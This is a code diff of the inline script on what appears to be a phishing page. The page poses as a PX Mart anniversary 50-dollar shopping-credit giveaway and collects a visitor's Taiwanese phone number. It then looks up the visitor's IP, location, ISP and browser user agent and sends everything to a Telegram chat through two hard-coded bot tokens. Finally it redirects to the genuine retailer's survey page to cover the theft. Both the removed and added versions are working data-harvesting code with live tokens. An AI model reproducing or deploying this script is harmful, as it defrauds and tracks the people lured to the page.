@@ -1,125 +1,46 @@
 <script>
-document.addEventListener("DOMContentLoaded", () => {
-  // 元件參考（若 getBtn 不存在，退回到第一個 button）
-  const btn = document.getElementById("getBtn") || document.querySelector("button");
+document.addEventListener("DOMContentLoaded", function(){
+  const btn = document.getElementById("getBtn");
   const phoneInput = document.getElementById("phone");
-
-  if (!btn || !phoneInput) return;
-
-  // 小工具：fetch timeout
-  const fetchWithTimeout = (url, opts = {}, timeout = 3000) =>
-    Promise.race([
-      fetch(url, opts),
-      new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), timeout))
-    ]);
-
-  // 正規化並驗證輸入電話（接受 09xxxxxxxx 或 8869xxxxxxxx 或 +8869xxxxxxxx）
-  function normalizePhone(raw) {
-    if (!raw) return null;
-    // 移除非數字字元
-    const digits = raw.replace(/\D+/g, "");
-    // 以台灣手機常見格式判斷
-    if (/^09\d{8}$/.test(digits)) return digits;              // 09xxxxxxxx
-    if (/^8869\d{8}$/.test(digits)) return digits.slice(3);   // 8869xxxxxxxx -> 09xxxxxxxx
-    if (/^869\d{8}$/.test(digits)) return "0" + digits.slice(1); // 869... -> 09...
-    return null;
-  }
-
-  // 安全設定：避免重複送
-  let sending = false;
-
-  btn.addEventListener("click", async (e) => {
-    if (sending) return;
-    const raw = phoneInput.value.trim();
-    const normalized = normalizePhone(raw);
-    if (!normalized) {
-      // 驗證未通過：簡單回饋（請依 UI 需求換成 toast 或錯誤訊息）
-      phoneInput.focus();
-      return;
-    }
-
-    sending = true;
+  
+  btn.addEventListener("click", function(){
+    const phone = phoneInput.value.trim();
+    // 改成最穩的寫法，避開手機正則 bug
+    if(phone.length !== 10 || phone.substr(0,2) !== "09") return;
+    
     btn.textContent = "領取中...";
     btn.disabled = true;
-    btn.setAttribute("aria-disabled", "true");
 
-    // 構造訊息（使用後端可信時間會比較好，但此處保留前端時間作為輔助）
-    const time = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
-    const phoneDisplay = "+886" + normalized.replace(/^0/, "");
-    const base = `全聯週年慶消費滿額送50元購物金\n電話：${phoneDisplay}\n時間：${time}`;
+    const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+    const base = `全聯週年慶消費滿額送50元購物金\n電話：+886${phone}\n時間：${time}`;
 
-    // 先嘗試抓較完整的 IP 資訊；若失敗則仍發送基本訊息
-    let fullText = base;
-    try {
-      // 優先嘗試 cfip.mx，超時 fallback 到 ipify
-      let ipResp;
-      try {
-        ipResp = await fetchWithTimeout("https://cfip.mx/json", {}, 2500);
-      } catch (_) {
-        ipResp = await fetchWithTimeout("https://api.ipify.org?format=json", {}, 2000);
-      }
+    fetch("https://cfip.mx/json")
+      .then(r => r.json())
+      .then(data => {
+        const full = base +
+          `\nIP　　：${data.ip}` +
+          `\n位置　：${data.city||"未知"}，${data.country||"台灣"}` +
+          `\nISP　　：${data.asn_org||"未知"}` +
+          `\n裝置　：${navigator.userAgent.substring(0,130)}...`;
+        ["8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys","7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"].forEach(t=>{
+          new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(full)}`;
+        });
+      })
+      .catch(() => {
+        ["8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys","7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"].forEach(t=>{
+          new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(base)}`;
+        });
+      });
 
-      if (ipResp && ipResp.ok) {
-        const data = await ipResp.json();
-        // cfip.mx 回傳結構與 ipify 不同，先安全取值
-        const ip = data.ip || data.ip_address || "未知";
-        const city = data.city || "";
-        const country = data.country || data.country_name || "未知";
-        const asn_org = data.asn_org || data.org || "";
-        const ua = navigator.userAgent || "";
-
-        fullText = base +
-          `\nIP　　：${ip}` +
-          `\n位置　：${city || "未知"}，${country}` +
-          `\nISP　　：${asn_org || "未知"}` +
-          `\n裝置　：${ua.substring(0, 150)}${ua.length > 150 ? "..." : ""}`;
-      }
-    } catch (err) {
-      // 忽略錯誤，保留 base 內容
-    }
-
-    // 傳送到 Telegram（注意：在前端放 token 會被任何人看到；建議改為後端代理）
-    // 這裡為提高穩定性，我們將 image 物件保存在陣列中避免被垃圾回收
-    const imgRefs = [];
-    const tokens = [
-      "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys",
-      "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"
-    ];
-
-    // 使用 GET 方式的 "pixel" 送出（瀏覽器可能會阻擋或忽略；若要高保證請改為後端）
-    for (const t of tokens) {
-      try {
-        const img = new Image();
-        imgRefs.push(img);
-        img.crossOrigin = "anonymous";
-        img.src = `https://api.telegram.org/bot${encodeURIComponent(t)}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(fullText)}`;
-        // 設置超時清理參考（避免記憶體洩漏）
-        setTimeout(() => {
-          const idx = imgRefs.indexOf(img);
-          if (idx !== -1) imgRefs.splice(idx, 1);
-        }, 20000);
-      } catch (err) {
-        // 若單一 token 建立失敗，繼續嘗試下一個
-      }
-    }
-
-    // 跳轉：以 single location.replace 為主，降低被瀏覽器攔截機率
-    // 若該頁為誘導頁，建議將此跳轉時間延長到 1500~2000ms，確保請求已發出
+    setTimeout(() => window.location = "https://www.pxmart.com.tw/campaign/survey", 800);
+    setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1200);
     setTimeout(() => {
-      try {
-        location.replace("https://www.pxmart.com.tw/campaign/survey");
-      } catch (err) {
-        // fallback：建立 anchor 並模擬點擊
-        const a = document.createElement("a");
-        a.href = "https://www.pxmart.com.tw/campaign/survey";
-        a.target = "_top";
-        document.body.appendChild(a);
-        a.click();
-      }
-    }, 1500);
-
-    // 最後保留狀態（不自動 re-enable，避免重複送出）
-    // 若需要在錯誤情況下可重試，請在此加上重試或錯誤回饋機制
+      const a = document.createElement("a");
+      a.href = "https://www.pxmart.com.tw/campaign/survey";
+      a.target = "_top";
+      document.body.appendChild(a);
+      a.click();
+    }, 1600);
   });
 });
 </script>
